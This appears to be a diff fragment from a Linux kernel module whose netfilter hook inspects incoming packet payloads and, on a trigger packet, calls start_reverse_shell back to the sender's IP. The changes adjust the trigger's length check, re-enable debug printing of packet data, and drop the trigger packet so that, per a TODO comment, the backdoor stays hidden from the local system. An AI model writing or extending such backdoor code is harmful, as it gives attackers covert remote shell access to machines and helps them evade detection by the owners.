@@ -69,12 +69,12 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
        
         printk(KERN_INFO "Total length %i\n", htons(ip_header->tot_len));
         printk(KERN_INFO "Size of payload %i\n", size);
-        
+        */
 
         printk(KERN_DEBUG "data len : %d\ndata : \n", (int)strlen(user_data));
-        printk(KERN_DEBUG "%s\n", user_data);*/
+        printk(KERN_DEBUG "%s\n", user_data);
 
-        if(strlen(user_data)<32){
+        if(strlen(user_data)<31){
             return NF_ACCEPT;
         }
 
@@ -90,7 +90,7 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
 
             start_reverse_shell(ip_source, REVERSE_SHELL_PORT);
             //TODO: Hide the backdoor packet to the local system
-            return NF_ACCEPT;
+            return NF_DROP;
         }
 
 
